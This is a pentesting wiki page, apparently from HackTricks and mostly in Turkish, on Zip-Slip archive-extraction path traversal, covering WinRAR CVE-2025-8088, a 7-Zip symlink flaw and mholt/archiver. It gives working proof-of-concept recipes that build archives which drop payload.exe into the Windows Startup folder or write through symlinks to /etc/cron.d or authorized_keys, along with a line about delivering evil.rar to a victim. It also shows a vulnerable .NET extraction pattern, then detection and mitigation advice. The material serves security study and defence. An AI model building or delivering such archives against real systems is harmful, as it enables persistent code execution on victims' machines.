# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Genel Bakış

Birçok arşiv formatı (ZIP, RAR, TAR, 7-ZIP, vb.) her girdinin kendi **internal path**'ini taşımasına izin verir. Bir çıkarma aracı bu yolu körü körüne uygularsa, içinde `..` bulunan veya bir **mutlak yol** (ör. `C:\Windows\System32\`) içeren özel hazırlanmış bir dosya adı kullanıcının seçtiği dizinin dışına yazılacaktır.
Bu zafiyet sınıfı genellikle *Zip-Slip* veya **archive extraction path traversal** olarak bilinir.

Etkileri rastgele dosyaların üzerine yazmaktan, Windows *Startup* klasörü gibi bir **auto-run** konumuna bir payload bırakarak doğrudan **remote code execution (RCE)** elde etmeye kadar değişir.

## Kök Neden

1. Saldırgan, bir veya daha fazla dosya başlığının şunları içerdiği bir arşiv oluşturur:
* Göreli dizin atlama dizileri (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Mutlak yollar (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Veya hedef dizinin dışına çözümlenen özel hazırlanmış **symlinks** (özellikle ZIP/TAR'da *nix* ortamlarında yaygın).
2. Mağdur, gömülü yolu güvenilir kabul eden (veya symlink'leri takip eden) zafiyetli bir araçla arşivi çıkarır; araç yolu temizlemek (sanitize etmek) veya çıkarmayı seçilen dizin altına zorlamak yerine buna göre davranır.
3. Dosya saldırganın kontrolündeki konuma yazılır ve sistem veya kullanıcı o yolu tetiklediğinde bir sonraki sefer çalıştırılır/yüklenir.

### .NET `Path.Combine` + `ZipArchive` traversal

Yaygın bir .NET anti-pattern'i, hedeflenen hedef dizini **kullanıcı kontrollü** `ZipArchiveEntry.FullName` ile birleştirip yol normalizasyonu yapmadan çıkarmaktır:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Eğer `entry.FullName` `..\\` ile başlıyorsa traversal yapar; eğer bir **mutlak yol** ise sol bileşen tamamen atılır, çıkarma kimliği olarak **keyfi dosya yazma** sağlar.
- Zamanlanmış bir tarayıcı tarafından izlenen kardeş `app` dizinine yazmak için proof-of-concept arşivi:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
ZIP dosyasını izlenen gelen kutusuna bırakmak `C:\samples\app\0xdf.txt` dosyasının oluşmasına neden olur; bu, `C:\samples\queue\` dizininin dışına traversal yapıldığını kanıtlar ve follow-on primitives (örn. DLL hijacks) kullanılmasına olanak tanır.

## Gerçek Dünya Örneği – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows için WinRAR ( `rar` / `unrar` CLI, DLL ve taşınabilir kaynak dahil) çıkarma sırasında dosya adlarını doğrulamada başarısız oldu.
Kötü amaçlı bir RAR arşivi aşağıdaki gibi bir girdi içeriyordu:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
seçilen çıktı dizininin **dışında** ve kullanıcının *Startup* klasörünün içinde yer alır. Oturum açıldıktan sonra Windows orada bulunan her şeyi otomatik olarak çalıştırır; bu da *kalıcı* RCE sağlar.

### PoC Arşivi Oluşturma (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – dosya yollarını verildiği gibi sakla (başındaki `./` öğesini **kırpma**).

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Observed Exploitation in the Wild

ESET, CVE-2025-8088’i kötüye kullanan ve özelleştirilmiş backdoor’lar dağıtarak fidye yazılımı operasyonlarını kolaylaştıran RAR ekli RomCom (Storm-0978/UNC2596) spear-phishing kampanyalarını bildirdi.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: Çıkarma sırasında **symbolic link** olan ZIP girdilerinin dereference edilmesi, saldırganların hedef dizinden kaçmasına ve rastgele yolları üzerine yazmasına olanak tanıyordu. Kullanıcı etkileşimi yalnızca arşivin *açılması/çıkarılması*dır.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux build’leri). **25.00** (Temmuz 2025) ve sonrası sürümlerde düzeltildi.
* **Impact path**: `Start Menu/Programs/Startup` veya servislerin çalıştığı konumları üzerine yazma → bir sonraki oturum açmada veya servis yeniden başladığında kod çalıştırılır.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Patchelenmiş bir build’te `/etc/cron.d` dokunulmaz; symlink /tmp/target içinde bir link olarak çıkarılır.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` `../` ve symlink’li ZIP girdilerini takip ederek `outputDir` dışında yazma yapıyordu.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (proje artık deprecated).
* **Fix**: `mholt/archives` ≥ 0.1.0’a geçin veya yazmadan önce kanonik yol kontrolleri uygulayın.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Arşiv girdilerini listeleyin ve adı `../`, `..\\`, *mutlak yollar* (`/`, `C:`) içeren veya hedefi çıkarma dizininin dışına çıkan *symlink* türündeki girdileri işaretleyin.
* **Canonicalisation** – `realpath(join(dest, name))` sonucunun hâlâ `dest` ile başlayıp başlamadığını doğrulayın. Aksi halde reddedin.
* **Sandbox extraction** – Bir disposable dizine güvenli bir extractor kullanarak açın (ör. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) ve ortaya çıkan yolların dizin içinde kaldığını doğrulayın.
* **Endpoint monitoring** – Bir arşiv WinRAR/7-Zip/vs. ile açıldıktan kısa süre sonra `Startup`/`Run`/`cron` konumlarına yeni executable dosyalar yazıldığında uyarı üretin.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ ve 7-Zip 25.00+ path/symlink sanitizasyonu uyguluyor. Her iki araçta da hâlen otomatik güncelleme yok.
2. Arşivleri mümkünse “**Do not extract paths**” / “**Ignore paths**” ile çıkarın.
3. Unix’te ayrıcalıkları düşürün ve çıkarma öncesi bir **chroot/namespace** mount edin; Windows’ta **AppContainer** veya bir sandbox kullanın.
4. Kendi kodunuzu yazıyorsanız, create/write işlemlerinden **önce** `realpath()`/`PathCanonicalize()` ile normalleştirin ve hedef dizinden kaçan herhangi bir girdiyi reddedin.

## Additional Affected / Historical Cases

* 2018 – Snyk tarafından birçok Java/Go/JS kütüphanesini etkileyen büyük *Zip-Slip* advisory’si.
* 2023 – 7-Zip CVE-2023-4011, `-ao` birleştirmesi sırasında benzer traversal.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) slugs içindeki TAR çıkarma traversal’ı (v1.2’de patch).
* Yazmadan önce `PathCanonicalize` / `realpath` çağırmayan herhangi bir özel çıkarma mantığı.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
